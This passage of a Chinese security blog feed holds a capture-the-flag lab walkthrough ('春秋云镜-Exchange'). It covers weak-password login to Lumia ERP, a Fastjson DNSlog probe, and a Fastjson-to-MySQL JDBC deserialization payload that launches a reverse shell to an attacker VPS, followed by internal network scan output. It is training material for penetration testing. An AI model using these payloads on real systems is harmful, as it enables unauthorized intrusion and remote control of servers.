+#++#+<br>SMB         172.22.6.12     445    DC-PROGAME       <span class="hljs-comment">#+#        #+#    #+#       #+##+#</span><br>SMB         172.22.6.12     445    DC-PROGAME       <span class="hljs-comment">###    ##############       #############</span><br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME       flag04: flag&#123;b3dd441d-8703-482f-aead-598fa800ade2&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2021-34371 Neo4j AS-REP Roasting SIDHistory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Exchange</title>
    <link href="/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"/>
    <url>/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/</url>
    
    <content type="html"><![CDATA[<p>Fastjson+JDBC，Exchange 服务 Microsoft Exchange Proxylogon 利用，WirteDacl 权限，哈希传递攻击</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">aWeb</span>\<span class="hljs-title">fscan</span>-<span class="hljs-title">main</span>&gt;.\<span class="hljs-title">fscan.exe</span> -<span class="hljs-title">h</span> 39.98.107.181</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">___</span>                              <span class="hljs-title">_</span></span><br><span class="hljs-function">  / <span class="hljs-title">_</span> \     <span class="hljs-title">___</span>  <span class="hljs-title">___</span> <span class="hljs-title">_</span> <span class="hljs-title">__</span> <span class="hljs-title">__</span> <span class="hljs-title">_</span>  <span class="hljs-title">___</span>| | <span class="hljs-title">__</span></span><br><span class="hljs-function"> / /<span class="hljs-title">_</span>\/<span class="hljs-title">____</span>/ <span class="hljs-title">__</span>|/ <span class="hljs-title">__</span>| &#x27;<span class="hljs-title">__</span>/ <span class="hljs-title">_</span>` |/ <span class="hljs-title">__</span>| |/ /</span><br><span class="hljs-function">/ /<span class="hljs-title">_</span>\\<span class="hljs-title">_____</span>\<span class="hljs-title">__</span> \ (<span class="hljs-title">__</span>| | | (<span class="hljs-title">_</span>| | (<span class="hljs-title">__</span>|   &lt;</span><br><span class="hljs-function">\<span class="hljs-title">____</span>/     |<span class="hljs-title">___</span>/\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|  \<span class="hljs-title">__</span>,<span class="hljs-title">_</span>|\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|\<span class="hljs-title">_</span>\</span><br><span class="hljs-function">                     <span class="hljs-title">fscan</span> <span class="hljs-title">version</span>: 1.8.4</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">infoscan</span></span><br><span class="hljs-function">39.98.107.181:80 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.98.107.181:22 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.98.107.181:8000 <span class="hljs-title">open</span></span><br><span class="hljs-function">[*] <span class="hljs-title">alive</span> <span class="hljs-title">ports</span> <span class="hljs-title">len</span> <span class="hljs-title">is</span>: 3</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">vulscan</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181      <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:219    <span class="hljs-title">title:None</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181:8000 <span class="hljs-title">code</span>:302 <span class="hljs-title">len</span>:0      <span class="hljs-title">title:None</span> 跳转<span class="hljs-title">url</span>: <span class="hljs-title">http</span>://39.98.107.181:8000/<span class="hljs-title">login.html</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181:8000/<span class="hljs-title">login.html</span> <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:5662   <span class="hljs-title">title:Lumia</span> <span class="hljs-title">ERP</span></span><br><span class="hljs-function">已完成 3/3</span><br><span class="hljs-function">[*] 扫描结束,耗时: 50.5764704<span class="hljs-title">s</span></span><br></code></pre></td></tr></table></figure><h1 id="Fastjson-JDBC-利用"><a href="#Fastjson-JDBC-利用" class="headerlink" title="Fastjson + JDBC 利用"></a>Fastjson + JDBC 利用</h1><p>有 web 页面，Lumia ERP 登陆界面，admin:123456 弱口令登陆进去</p><p>点击 “官方插件” 跳转到了一个网站，但显示域名已过期</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.huaxiaerp.com/forum-43-1.html<br></code></pre></td></tr></table></figure><p>搜索后发现是 <code>华夏 ERP</code>，存在 fastjson 漏洞，位置于 <code>/user/list?search=</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.ot5kfv.dnslog.cn&quot;&#125;<br></code></pre></td></tr></table></figure><p>poc 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%62%75%74%74%33%72%66%31%79%2e%73%74%6a%32%33%61%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d%0a<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/424bc3e46c8dbc4b.png"></p><p>dnslog 测试成功，可以利用</p><p>打 JDBC-JDBC4Connection：<a href="https://xz.aliyun.com/news/18109">手把手带你深入分析 Fastjson JDBC 调用链利用过程-先知社区</a></p><p>启动 evil-mysql-server 服务器</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">./evil-mysql-server -addr <span class="hljs-number">3306</span> -java java -ysoserial ysoserial-all.jar <br></code></pre></td></tr></table></figure><p>url 编码后发送反弹 shell 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;name&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<br><span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;vpsIP地址&quot;</span>,<br><span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span>,<br><span class="hljs-string">&quot;info&quot;</span>: &#123;<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64编码后的命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>,<br><span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br><span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br><span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c0c6eed1eda3cd65.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/c2027971eeb989de.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">846</span>e59ef-<span class="hljs-number">3802</span>-<span class="hljs-number">4</span>db5-bd3e-e004d70c0af4&#125;<br></code></pre></td></tr></table></figure><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>查看本机 IP：172.22.3.12</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">2</span>b:<span class="hljs-number">7</span>f:<span class="hljs-number">46</span>  <br>          inet addr:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>  Bcast:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>          inet6 addr: fe80::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe2b:<span class="hljs-number">7</span>f46/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packets:<span class="hljs-number">174430</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          TX packets:<span class="hljs-number">52652</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br><span class="hljs-function">          collisions:0 <span class="hljs-title">txqueuelen</span>:1000 </span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">bytes</span>:212622994 (212.6 <span class="hljs-title">MB</span>)  <span class="hljs-title">TX</span> <span class="hljs-title">bytes</span>:27000176 (27.0 <span class="hljs-title">MB</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">lo</span>        <span class="hljs-title">Link</span> <span class="hljs-title">encap:Local</span> <span class="hljs-title">Loopback</span>  </span><br><span class="hljs-function">          <span class="hljs-title">inet</span> <span class="hljs-title">addr</span>:127.0.0.1  <span class="hljs-title">Mask</span>:255.0.0.0</span><br><span class="hljs-function">          <span class="hljs-title">inet6</span> <span class="hljs-title">addr</span>: ::1/128 <span class="hljs-title">Scope:Host</span></span><br><span class="hljs-function">          <span class="hljs-title">UP</span> <span class="hljs-title">LOOPBACK</span> <span class="hljs-title">RUNNING</span>  <span class="hljs-title">MTU</span>:65536  <span class="hljs-title">Metric</span>:1</span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">packets</span>:10258 <span class="hljs-title">errors</span>:0 <span class="hljs-title">dropped</span>:0 <span class="hljs-title">overruns</span>:0 <span class="hljs-title">frame</span>:0</span><br><span class="hljs-function">          <span class="hljs-title">TX</span> <span class="hljs-title">packets</span>:10258 <span class="hljs-title">errors</span>:0 <span class="hljs-title">dropped</span>:0 <span class="hljs-title">overruns</span>:0 <span class="hljs-title">carrier</span>:0</span><br><span class="hljs-function">          <span class="hljs-title">collisions</span>:0 <span class="hljs-title">txqueuelen</span>:1 </span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">bytes</span>:2732393 (2.7 <span class="hljs-title">MB</span>)  <span class="hljs-title">TX</span> <span class="hljs-title">bytes</span>:2732393 (2.7 <span class="hljs-title">MB</span>)</span><br></code></pre></td></tr></table></figure><h2 id="fscan-扫内网"><a href="#fscan-扫内网" class="headerlink" title="fscan 扫内网"></a>fscan 扫内网</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># ./FScan_2.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>_linux_x64 -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>/<span class="hljs-number">24</span><br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     已选择服务扫描模式<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     开始信息扫描<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     CIDR范围: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">255</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     generate_ip_range_full<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     解析CIDR <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>/<span class="hljs-number">24</span> -&gt; IP范围 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">255</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     最终有效主机数量: <span class="hljs-number">256</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     开始主机扫描<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] 目标 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     存活 (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] 目标 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      存活 (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] 目标 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     存活 (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] 目标 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      存活 (ICMP)<br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s]     存活主机数量: <span class="hljs-number">4</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s]     有效端口数量: <span class="hljs-number">233</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">80</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">22</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">389</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">88</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">808</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">443</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">80</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] 端口开放 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     扫描完成, 发现 <span class="hljs-number">19</span> 个开放端口<br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     存活端口数量: <span class="hljs-number">19</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     开始漏洞扫描<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] 网站标题 http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>        状态码:<span class="hljs-number">200</span> 长度:<span class="hljs-number">19813</span>  标题:lumia<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s]     POC加载完成: 总共<span class="hljs-number">387</span>个，成功<span class="hljs-number">387</span>个，失败<span class="hljs-number">0</span>个<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo 扫描结果<br>目标主机: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>主机名: XIAORANG-PC<br>发现的网络接口:<br>   IPv4地址:<br>      └─ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo 扫描结果<br>目标主机: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>主机名: XIAORANG-EXC01<br>发现的网络接口:<br>   IPv4地址:<br>      └─ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo 扫描结果<br>目标主机: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>主机名: XIAORANG-WIN16<br>发现的网络接口:<br>   IPv4地址:<br>      └─ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC          <br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s]     系统信息 <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> [Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>]<br>[<span class="hljs-number">6</span>.<span class="hljs-number">4</span>s] [*] 网站标题 http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>   状态码:<span class="hljs-number">302</span> 长度:<span class="hljs-number">0</span>      标题:无标题 重定向地址: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html<br>[<span class="hljs-number">6</span>.<span class="hljs-number">5</span>s] [*] 网站标题 http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      状态码:<span class="hljs-number">403</span> 长度:<span class="hljs-number">1157</span>   标题:<span class="hljs-number">403</span> - 禁止访问: 访问被拒绝。<br>[<span class="hljs-number">6</span>.<span class="hljs-number">6</span>s] [*] 网站标题 http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html 状态码:<span class="hljs-number">200</span> 长度:<span class="hljs-number">5662</span>   标题:Lumia ERP<br>[<span class="hljs-number">7</span>.<span class="hljs-number">4</span>s] [*] 网站标题 http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         状态码:<span class="hljs-number">403</span> 长度:<span class="hljs-number">0</span>      标题:无标题<br>[<span class="hljs-number">7</span>.<span class="hljs-number">8</span>s] [*] 网站标题 https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        状态码:<span class="hljs-number">302</span> 长度:<span class="hljs-number">0</span>      标题:无标题 重定向地址: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<br>[<span class="hljs-number">8</span>.<span class="hljs-number">5</span>s] [*] 网站标题 https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/   状态码:<span class="hljs-number">200</span> 长度:<span class="hljs-number">28237</span>  标题:Outlook<br>[<span class="hljs-number">10</span>.<span class="hljs-number">0</span>s] [*] 网站标题 https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   状态码:<span class="hljs-number">404</span> 长度:<span class="hljs-number">0</span>      标题:无标题<br>[<span class="hljs-number">1</span>m51s]     扫描已完成: <span class="hljs-number">36</span>/<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>得到以下信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>本机<br><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span>域控<br><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC          <br><span 